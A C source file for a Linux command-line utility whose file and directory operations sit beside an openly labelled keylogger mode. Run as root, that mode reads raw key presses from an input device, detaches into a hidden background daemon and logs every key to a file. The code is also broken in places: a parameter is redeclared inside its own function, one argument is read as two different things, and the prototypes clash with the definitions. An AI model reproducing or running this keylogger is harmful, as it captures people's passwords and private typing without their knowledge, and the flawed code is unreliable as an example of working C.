#include <dirent.h>
#include <fcntl.h>
#include <linux/input.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

FILE *log_file = NULL;
int KEYLOGGER_PID;

// Function prototypes
void file_operations();
void directory_operations();
void start_keylogger();
void stop_keylogger(int sig);

int main(int argc, char *argv[])
{

    int mode = atoi(argv[2]);
    int operation = atoi(argv[3]);
    char *parameter = argv[4];

    switch (mode)
    {
    case 1: // File operations
        file_operations(operation, parameter);
        break;
    case 2: // Directory operations
        directory_operations(operation, parameter);
        break;
    case 3: // Keylogger

        if (geteuid() != 0)
        {
            fprintf(stderr, "[-] Please run the program as root\n");
            exit(EXIT_FAILURE);
        }

        char *log_filename = argv[3];
        if (strchr(log_filename, '/') != NULL)
        {
            fprintf(stderr, "[-] Log filename should not be a path. Please provide a valid filename. Your log file will store in the root directory.\n");
            exit(EXIT_FAILURE);
        }
        start_keylogger(log_filename);
        break;
    default:
        fprintf(stderr, "[-] Invalid mode. Please use 1 for file, 2 for directory, or 3 for keylogger.\n");
        exit(EXIT_FAILURE);
    }

    return 0;
}


void file_operations(int mode, char *filename)
{
    int fd;
    char buffer[1024];
    ssize_t bytes;

    switch (mode)
    {
    case 1: // Create/Open a new file
        // Check if the directory exists, if not create it
        char *dir = strdup(filename);
        char *last_slash = strrchr(dir, '/');
        if (last_slash != NULL)
        {
            *last_slash = '\0';
            struct stat st = {0};
            if (stat(dir, &st) == -1)
            {
                if (mkdir(dir, 0755) == -1)
                {
                    perror("[-] Error creating directory");
                    free(dir);
                    return;
                }
                else
                {
                    printf("[+] Directory %s created successfully.\n", dir);
                }
            }
        }
        free(dir);

        // Create/Open the file
        fd = open(filename, O_CREAT | O_RDWR, 0644);
        if (fd == -1)
        {
            perror("[-] Error opening/creating file");
        }
        else
        {
            printf("[+] File %s created/opened successfully.\n", filename);
            close(fd);
        }
        break;
    case 2: // Change file permissions
        printf("Enter the new permissions (in octal): ");
        int permissions;
        scanf("%o", &permissions);

        // Validate the octal permission
        if (permissions < 0 || permissions > 0777)
        {
            fprintf(stderr, "[-] Invalid permissions. Please enter a value between 000 and 777.\n");
        }
        else if (chmod(filename, permissions) == -1)
        {
            perror("[-] Error changing file permissions");
        }
        else
        {
            printf("[+] Permissions of file %s changed successfully.\n", filename);
        }
        break;
    case 3: // Read from file
        fd = open(filename, O_RDONLY);
        if (fd == -1)
        {
            perror("[-] Error opening file");
        }
        else
        {
            bytes = read(fd, buffer, sizeof(buffer) - 1);
            if (bytes == -1)
            {
                perror("[-] Error reading file");
            }
            else
            {
                buffer[bytes] = '\0';
                printf("File contents:\n%s\n", buffer);
            }
            close(fd);
        }
        break;
    case 4: // Write to file
        fd = open(filename, O_WRONLY | O_APPEND);
        if (fd == -1)
        {
            perror("[-] Error opening file");
        }
        else
        {
            printf("Enter the text to write: ");
            scanf(" %[^\n]", buffer);
            bytes = write(fd, buffer, strlen(buffer));
            if (bytes == -1)
            {
                perror("[-] Error writing to file");
            }
            else
            {
                printf("[+] Text written to file successfully.\n");
            }
            close(fd);
        }
        break;
    case 5: // Remove file
        if (remove(filename) == -1)
        {
            perror("[-] Error deleting file");
        }
        else
        {
            printf("[+] File %s deleted successfully.\n", filename);
        }
        break;
    default:
        fprintf(stderr, "[-] Invalid operation for file operations.\n");
    }
}


void directory_operations(int mode, char *path)
{
    DIR *dir;
    struct dirent *entry;

    switch (mode)
    {
    case 1: // Create a new directory
        if (mkdir(path, 0755) == -1)
        {
            perror("[-] Error creating directory");
        }
        else
        {
            printf("[+] Directory %s created successfully.\n", path);
        }
        break;
    case 2: // Remove directory
        if (rmdir(path) == -1)
        {
            perror("[-] Error deleting directory");
        }
        else
        {
            printf("[+] Directory %s deleted successfully.\n", path);
        }
        break;
    case 3: // Print current working directory
    {
        char cwd[1024];
        if (getcwd(cwd, sizeof(cwd)) == NULL)
        {
            perror("[-] Error getting current working directory");
        }
        else
        {
            printf("[+] Current working directory: %s\n", cwd);
        }
        break;
    }
    case 4: // List contents of a directory
        dir = opendir(path);
        if (dir == NULL)
        {
            perror("[-] Error opening directory");
        }
        else
        {
            printf("[+] Contents of directory %s:\n", path);
            while ((entry = readdir(dir)) != NULL)
            {
                printf("%s\n", entry->d_name);
            }
            closedir(dir);
        }
        break;
    default:
        fprintf(stderr, "[-] Invalid operation for directory operations.\n");
    }
}

// Map key codes to characters
const char *get_key_name(int code)
{
    switch (code)
    {
    case 1:
        return "ESC";
    case 2:
        return "1";
    case 3:
        return "2";
    case 4:
        return "3";
    case 5:
        return "4";
    case 6:
        return "5";
    case 7:
        return "6";
    case 8:
        return "7";
    case 9:
        return "8";
    case 10:
        return "9";
    case 11:
        return "0";
    case 12:
        return "-";
    case 13:
        return "=";
    case 14:
        return "BACKSPACE";
    case 15:
        return "TAB";
    case 16:
        return "Q";
    case 17:
        return "W";
    case 18:
        return "E";
    case 19:
        return "R";
    case 20:
        return "T";
    case 21:
        return "Y";
    case 22:
        return "U";
    case 23:
        return "I";
    case 24:
        return "O";
    case 25:
        return "P";
    case 26:
        return "[";
    case 27:
        return "]";
    case 28:
        return "ENTER";
    case 29:
        return "CTRL";
    case 30:
        return "A";
    case 31:
        return "S";
    case 32:
        return "D";
    case 33:
        return "F";
    case 34:
        return "G";
    case 35:
        return "H";
    case 36:
        return "J";
    case 37:
        return "K";
    case 38:
        return "L";
    case 39:
        return ";";
    case 40:
        return "'";
    case 41:
        return "`";
    case 42:
        return "SHIFT";
    case 43:
        return "\\";
    case 44:
        return "Z";
    case 45:
        return "X";
    case 46:
        return "C";
    case 47:
        return "V";
    case 48:
        return "B";
    case 49:
        return "N";
    case 50:
        return "M";
    case 51:
        return ",";
    case 52:
        return ".";
    case 53:
        return "/";
    case 54:
        return "SHIFT";
    case 55:
        return "KP *";
    case 56:
        return "ALT";
    case 57:
        return "SPACE";
    case 58:
        return "CAPSLOCK";
    case 59:
        return "F1";
    case 60:
        return "F2";
    case 61:
        return "F3";
    case 62:
        return "F4";
    case 63:
        return "F5";
    case 64:
        return "F6";
    case 65:
        return "F7";
    case 66:
        return "F8";
    case 67:
        return "F9";
    case 68:
        return "F10";
    case 69:
        return "NUMLOCK";
    case 70:
        return "SCROLLLOCK";
    case 71:
        return "KP 7";
    case 72:
        return "KP 8";
    case 73:
        return "KP 9";
    case 74:
        return "KP -";
    case 75:
        return "KP 4";
    case 76:
        return "KP 5";
    case 77:
        return "KP 6";
    case 78:
        return "KP +";
    case 79:
        return "KP 1";
    case 80:
        return "KP 2";
    case 81:
        return "KP 3";
    case 82:
        return "KP 0";
    case 83:
        return "KP .";
    case 87:
        return "F11";
    case 88:
        return "F12";
    case 97:
        return "CTRL_R";
    case 100:
        return "ALT_R";
    case 103:
        return "UP";
    case 105:
        return "LEFT";
    case 106:
        return "RIGHT";
    case 108:
        return "DOWN";
    case 110:
        return "INSERT";
    case 111:
        return "DELETE";
    case 119:
        return "PAUSE";
    default:
        return "UNKNOWN";
    }
}

void daemonize(char *log_filename)
{
    pid_t pid = fork();
    if (pid < 0)
    {
        perror("[-] Fork failed");
        exit(EXIT_FAILURE);
    }
    if (pid > 0)
    {
        // Parent process exits immediately
        exit(EXIT_SUCCESS);
    }

    // Child process becomes session leader
    if (setsid() < 0)
    {
        perror("[-] Failed to become session leader");
        exit(EXIT_FAILURE);
    }

    // Fork again to ensure the daemon cannot acquire a controlling terminal
    pid = fork();
    if (pid < 0)
    {
        perror("[-] Fork failed");
        exit(EXIT_FAILURE);
    }
    if (pid > 0)
    {
        // Exit the intermediate parent
        exit(EXIT_SUCCESS);
    }

    KEYLOGGER_PID = getpid();

    // Change working directory to root
    // reduce risk of locking directory
    if (chdir("/") < 0)
    {
        perror("[-] Failed to change directory to root");
        exit(EXIT_FAILURE);
    }

    // Redirect standard file descriptors to /dev/null
    fclose(stdin);
    fclose(stdout);
    fclose(stderr);
    open("/dev/null", O_RDONLY); // stdin
    open("/dev/null", O_WRONLY); // stdout
    open("/dev/null", O_WRONLY); // stderr
}

void start_keylogger(char *log_filename)
{

    char log_filename[256];

    printf("Enter the filename for keylogger log file: ");
    scanf("%s", log_filename);

    if (strchr(log_filename, '/') != NULL)
    {
        fprintf(stderr, "[-] Log filename should not be a path. Please provide a valid filename. Your log file will store in the root directory.\n");
        exit(EXIT_FAILURE);
    }

    // Open the input device (adjust as needed for your keyboard)
    int fd = open("/dev/input/event2", O_RDONLY);
    if (fd == -1)
    {
        perror("[-] Error opening input device (/dev/input/event2)");
        return;
    }

    printf("[+] Check keylogger PID in the log file: /%s\n", log_filename);

    // Set up signal handler
    signal(SIGTERM, stop_keylogger);
    signal(SIGINT, stop_keylogger);

    // Daemonize the process
    daemonize(log_filename);

    // Open the log file in append mode
    log_file = fopen(log_filename, "a");
    if (!log_file)
    {
        perror("[-] Error opening keylog file");
        close(fd);
        return;
    }

    // Write the session start timestamp to the log file
    time_t now = time(NULL);
    fprintf(log_file, "\n>>> Session [%d] started at %s", KEYLOGGER_PID, ctime(&now));
    fprintf(log_file, ">>> Kill session using: sudo kill %d \n", KEYLOGGER_PID);
    fflush(log_file);

    // Infinite loop to read and log key events
    struct input_event event;
    while (1)
    {
        // Read key events from the input device
        ssize_t bytes = read(fd, &event, sizeof(event));
        if (bytes == sizeof(event) && event.type == EV_KEY && event.value == 1) // Key press
        {
            const char *key_name = get_key_name(event.code);
            fprintf(log_file, "%s\n", key_name);
            fflush(log_file); // Ensure data is written to the file
        }
    }

    // Close resources (not reachable unless loop is exited)
    fclose(log_file);
    close(fd);
}

void stop_keylogger(int sig)
{
    const char *end_message = "--- Session ended gracefully ---\n";

    // Print to the log file
    if (log_file)
    {
        fprintf(log_file, "%s", end_message);
        fclose(log_file);
    }

    // Print to stdout using system call
    write(1, end_message, strlen(end_message)); // stdout

    exit(0);
}